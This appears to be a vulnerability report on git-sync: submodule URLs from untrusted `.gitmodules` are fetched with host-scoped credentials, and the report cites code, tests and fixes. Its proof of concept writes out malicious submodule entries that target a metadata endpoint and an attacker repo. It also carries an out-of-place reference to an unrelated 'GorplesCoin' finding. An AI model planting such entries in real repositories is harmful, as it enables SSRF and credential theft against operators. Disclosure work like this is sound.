### Title
Missing verification of submodule origin allows credential disclosure and SSRF via untrusted `.gitmodules` content - (File: `main.go`, function `configureWorktree`)

### Summary
`git-sync`'s `configureWorktree` runs `git submodule update --init [--recursive]` on every synced worktree without validating that submodule URLs (which are read from `.gitmodules`, a file that lives inside the tracked, remotely-controlled repository content) belong to the same trusted origin/host that `--repo` points to. This is directly analogous to the GorplesCoin `redeem()` finding: a security-relevant "origin" parameter (`_fromChain` there, submodule remote URL here) is taken from attacker-influenced payload data and acted upon without checking it is one of the values the operator actually intended to trust.

### Finding Description
`git.fetch` pulls the configured `--ref` from `git.repo` [1](#0-0) , and `configureWorktree` subsequently resets the worktree and then unconditionally runs `git submodule update --init` (optionally `--recursive`) whenever `git.submodules != submodulesOff` (which defaults to recursive per the README) [2](#0-1) .

The URLs that `git submodule update` fetches from come entirely from the `.gitmodules` file that is part of the synced commit content — i.e., content controlled by whoever can push to (or otherwise influence) the tracked upstream repository, not by the git-sync operator's `--repo`/`--credential` configuration. There is no code path in `configureWorktree`, `fetch`, or `SyncRepo` that cross-checks a submodule URL's host/scheme against `git.repo`'s host or against an operator-approved allow-list before invoking git on it.

Meanwhile, git-sync pre-loads authentication material that is scoped only loosely:
- `CallAskPassURL` stores a single username/password via `git.StoreCredentials(ctx, git.repo, username, password)`, which calls `git credential approve` [3](#0-2) , [4](#0-3) .
- git's credential store/approve matching is keyed by protocol+host (and optionally path only if `credential.useHttpPath` is set, which git-sync does not configure). This means any HTTPS submodule URL under the same host as `--repo` will transparently receive the same stored credential, regardless of which path/repo it points to.
- SSH key material is loaded generically for the whole git invocation (`--ssh-key-file`, potentially multiple, as shown by the e2e test that layers 3 different keys into one `GIT_SSH_COMMAND` for arbitrary hosts) [5](#0-4) , so an SSH submodule URL pointing at an attacker-controlled host will still attempt authentication with all configured keys.

Because the submodule URL is untrusted input from the synced content, and no validation ties it back to an expected origin, an attacker who can get a malicious `.gitmodules` entry into the tracked repo (directly, via a merged PR, or via a compromised upstream) can redirect the sidecar's outbound git request to any host, including internal-network / cloud-metadata endpoints (SSRF) or an attacker-controlled repo under the same credentialed host (credential replay/disclosure) — exactly the "wrong chain of origin trusted" bug class from the report.

### Impact Explanation
- **SSRF / persistent sync interference**: `configureWorktree` will attempt outbound `git` network operations to any host named in `.gitmodules`, including internal services or cloud metadata endpoints reachable from the sidecar's network namespace, without any allow-listing.
- **Credential/token disclosure**: Because git's credential matching is host-scoped (not full-URL-scoped) by default, and git-sync does not set `credential.useHttpPath`, credentials configured for `--repo`'s host via `--askpass-url` or `--credential` can be transparently presented to any submodule URL sharing that host, even one added by an untrusted commit that points to a different, attacker-owned path.
- This satisfies the "Accept only ..." bar for credential/token disclosure and SSRF-class network abuse reachable purely from attacker-pushed commit content, without requiring a malicious operator, malicious node, or leaked key.

### Likelihood Explanation
Likelihood is moderate-to-high in any deployment where:
1. `--submodules` is left at its default (`recursive`) — a routine default, not an opt-in flag.
2. The synced repository accepts contributions (PRs) from less-trusted parties, or the upstream repository itself could be compromised — a realistic supply-chain scenario for a sidecar whose whole job is to mirror a remote repo's exact content, including `.gitmodules`.
3. Any HTTPS/SSH credential is configured for the main repo's host (a common configuration per the README's `--credential`/`--askpass-url` docs), since that is what widens the blast radius from "SSRF only" to "credential disclosure."

No special flags beyond defaults are required to reach the SSRF portion; credential disclosure additionally requires an auth mechanism to be configured, which is a supported and documented (not niche) configuration.

### Recommendation
Before running `git submodule update`, either:
- Restrict submodule URL resolution to the same scheme+host as `--repo` (or an explicit operator-supplied allow-list of trusted hosts), rejecting/skipping submodules whose URL host does not match, or
- Set `credential.useHttpPath=true` when submodule support is combined with HTTP(S) credentials, so stored credentials are scoped to the exact path, not just host, and
- Document/require `--ssh-known-hosts` (already default true) but additionally scope SSH keys per-host via `~/.ssh/config` `Match host` blocks rather than passing all keys to `GIT_SSH_COMMAND` for every host.

### Proof of Concept
1. An attacker (with push/PR access to the tracked upstream repo, or having compromised it) adds a `.gitmodules` entry:
   ```
   [submodule "evil"]
       path = evil
       url = https://internal-metadata.example/latest/meta-data/
   ```
   or, to target credential replay:
   ```
   [submodule "evil"]
       path = evil
       url = https://github.com/attacker/evil-repo.git
   ```
   where the main `--repo` is also hosted on `github.com` and git-sync has been configured with `--credential`/`--askpass-url` for that host.
2. git-sync's next `SyncRepo` fetches the new commit and calls `configureWorktree`, which runs `git submodule update --init --recursive` [6](#0-5) .
3. Git resolves the submodule URL from the malicious `.gitmodules` and issues an outbound request to the attacker-chosen host/path, using whatever host-scoped credentials git-sync configured for the legitimate repo's host — with no check in git-sync's code that the submodule origin matches an expected/trusted source. [6](#0-5) [7](#0-6)

### Citations

**File:** main.go (L1727-1747)
```go
	// Reset the worktree's working copy to the specific ref.
	git.log.V(1).Info("setting worktree HEAD", "hash", hash)
	if _, _, err := git.Run(ctx, worktree.Path(), "reset", "--hard", hash, "--"); err != nil {
		return err
	}

	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}
```

**File:** main.go (L2001-2029)
```go
// fetch retrieves the specified ref from the upstream repo.
func (git *repoSync) fetch(ctx context.Context, ref string) error {
	git.log.V(2).Info("fetching", "ref", ref, "repo", redactURL(git.repo))

	// Fetch the ref and do some cleanup, setting or un-setting the repo's
	// shallow flag as appropriate.
	args := []string{"fetch", git.repo, ref, "--verbose", "--no-progress", "--prune", "--no-auto-gc"}
	if git.depth > 0 {
		args = append(args, "--depth", strconv.Itoa(git.depth))
	} else {
		// If the local repo is shallow and we're not using depth any more, we
		// need a special case.
		shallow, err := git.isShallow(ctx)
		if err != nil {
			return err
		}
		if shallow {
			args = append(args, "--unshallow")
		}
	}
	if git.filter != "" {
		args = append(args, "--filter", git.filter)
	}
	if _, _, err := git.Run(ctx, git.root, args...); err != nil {
		return err
	}

	return nil
}
```

**File:** main.go (L2055-2067)
```go
// StoreCredentials stores a username and password for later use.
func (git *repoSync) StoreCredentials(ctx context.Context, url, username, password string) error {
	git.log.V(1).Info("storing git credential", "url", redactURL(url))
	git.log.V(9).Info("md5 of credential", "url", url, "username", md5sum(username), "password", md5sum(password))

	creds := fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)
	_, _, err := git.RunWithStdin(ctx, "", creds, "credential", "approve")
	if err != nil {
		return fmt.Errorf("can't configure git credentials: %w", err)
	}

	return nil
}
```

**File:** main.go (L2133-2184)
```go
func (git *repoSync) CallAskPassURL(ctx context.Context) error {
	git.log.V(3).Info("calling auth URL to get credentials")

	var netClient = &http.Client{
		Timeout: time.Second * 1,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	httpReq, err := http.NewRequestWithContext(ctx, http.MethodGet, git.authURL, nil)
	if err != nil {
		return fmt.Errorf("can't create auth request: %w", err)
	}
	resp, err := netClient.Do(httpReq)
	if err != nil {
		return fmt.Errorf("can't access auth URL: %w", err)
	}
	defer func() {
		_ = resp.Body.Close()
	}()
	if resp.StatusCode != http.StatusOK {
		errMessage, err := io.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("auth URL returned status %d, failed to read body: %w", resp.StatusCode, err)
		}
		return fmt.Errorf("auth URL returned status %d, body: %q", resp.StatusCode, string(errMessage))
	}
	authData, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("can't read auth response: %w", err)
	}

	username := ""
	password := ""
	for line := range strings.SplitSeq(string(authData), "\n") {
		keyValues := strings.SplitN(line, "=", 2)
		if len(keyValues) != 2 {
			continue
		}
		switch keyValues[0] {
		case "username":
			username = keyValues[1]
		case "password":
			password = keyValues[1]
		}
	}

	if err := git.StoreCredentials(ctx, git.repo, username, password); err != nil {
		return err
	}

	return nil
```

**File:** test_e2e.sh (L3283-3352)
```shellscript
function e2e::submodule_sync_over_ssh_different_keys() {
    # Init nested submodule repo
    local nested_submodule_repo_name="nested-sub"
    local nested_submodule="$WORK/$nested_submodule_repo_name"
    mkdir "$nested_submodule"

    git -C "$nested_submodule" init -q -b "$MAIN_BRANCH"
    echo "nested-submodule" > "$nested_submodule/nested-submodule.file"
    git -C "$nested_submodule" add nested-submodule.file
    git -C "$nested_submodule" commit -aqm "init nested-submodule.file"

    # Run a git-over-SSH server.  Use key #1.
    local ctr_subsub
    ctr_subsub=$(docker_run \
        -v "$DOT_SSH/server/1":/dot_ssh:ro \
        -v "$nested_submodule":/git/repo:ro \
        e2e/test/sshd)
    local ip_subsub
    ip_subsub=$(docker_ip "$ctr_subsub")

    # Tell local git not to do host checking and to use the test keys.
    export GIT_SSH_COMMAND="ssh -F none -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i $DOT_SSH/1/id_local -i $DOT_SSH/2/id_local"

    # Init submodule repo
    local submodule_repo_name="sub"
    local submodule="$WORK/$submodule_repo_name"
    mkdir "$submodule"

    git -C "$submodule" init -q -b "$MAIN_BRANCH"
    echo "submodule" > "$submodule/submodule.file"
    git -C "$submodule" add submodule.file
    git -C "$submodule" commit -aqm "init submodule.file"

    # Add nested submodule to submodule repo
    git -C "$submodule" submodule add -q "test@$ip_subsub:/git/repo" "$nested_submodule_repo_name"
    git -C "$submodule" commit -aqm "add nested submodule"

    # Run a git-over-SSH server.  Use key #2.
    local ctr_sub
    ctr_sub=$(docker_run \
        -v "$DOT_SSH/server/2":/dot_ssh:ro \
        -v "$submodule":/git/repo:ro \
        e2e/test/sshd)
    local ip_sub
    ip_sub=$(docker_ip "$ctr_sub")

    # Add the submodule to the main repo
    git -C "$REPO" submodule add -q "test@$ip_sub:/git/repo" "$submodule_repo_name"
    git -C "$REPO" commit -aqm "add submodule"
    git -C "$REPO" submodule update --recursive --remote > /dev/null 2>&1

    # Run a git-over-SSH server.  Use key #3.
    local ctr
    ctr=$(docker_run \
        -v "$DOT_SSH/server/3":/dot_ssh:ro \
        -v "$REPO":/git/repo:ro \
        e2e/test/sshd)
    local ip
    ip=$(docker_ip "$ctr")

    GIT_SYNC \
        --period=100ms \
        --repo="test@$ip:/git/repo" \
        --root="$ROOT" \
        --link="link" \
        --ssh-key-file="/ssh/secret.1" \
        --ssh-key-file="/ssh/secret.2" \
        --ssh-key-file="/ssh/secret.3" \
        --ssh-known-hosts=false \
        &
```
